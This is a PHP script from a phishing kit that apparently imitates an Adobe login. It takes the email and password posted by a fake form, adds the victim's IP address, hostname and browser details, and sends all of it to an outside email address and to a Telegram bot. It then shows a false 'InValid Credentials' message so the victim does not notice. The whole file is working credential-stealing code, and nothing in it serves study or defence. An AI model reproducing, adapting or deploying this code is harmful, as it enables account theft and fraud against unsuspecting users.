<?php
$email = trim($_POST['ai']);
$password = trim($_POST['pr']);

function sendTotelegram($data) {
    // Ensure to replace these variables with your actual bot token and chat ID
    $bot = 'YOUR_BOT_TOKEN';
    $chat_id = 'YOUR_CHAT_ID';

    $data = urlencode($data);
    $api = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$chat_id&text=$data";
    $c = curl_init($api);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    $res = curl_exec($c);
    curl_close($c);
    return $res;
}

if($email != null && $password != null){
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message .= "|----------| xLs |--------------|\n";
    $message .= "Online ID            : ".$email."\n";
    $message .= "Passcode              : ".$password."\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "|Client IP: ".$ip."\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent : ".$useragent."\n";
    $message .= "|----------- CrEaTeD Dadsec.pw--------------|\n";
    
    // Send email (existing functionality)
    $send="logs.ironside511@yandex.com";
    $subject = "Adobe Login : $ip";
    mail($send, $subject, $message);
    
    // Send message to Telegram
    sendTotelegram($message);
    
    $signal = 'ok';
    $msg = 'InValid Credentials';
    
    // $praga=rand();
    // $praga=md5($praga);
}
else{
    $signal = 'bad';
    $msg = 'Please fill in all the fields.';
}
$data = array(
    'signal' => $signal,
    'msg' => $msg,
    'redirect_link' => $redirect,
);
echo json_encode($data);
?>
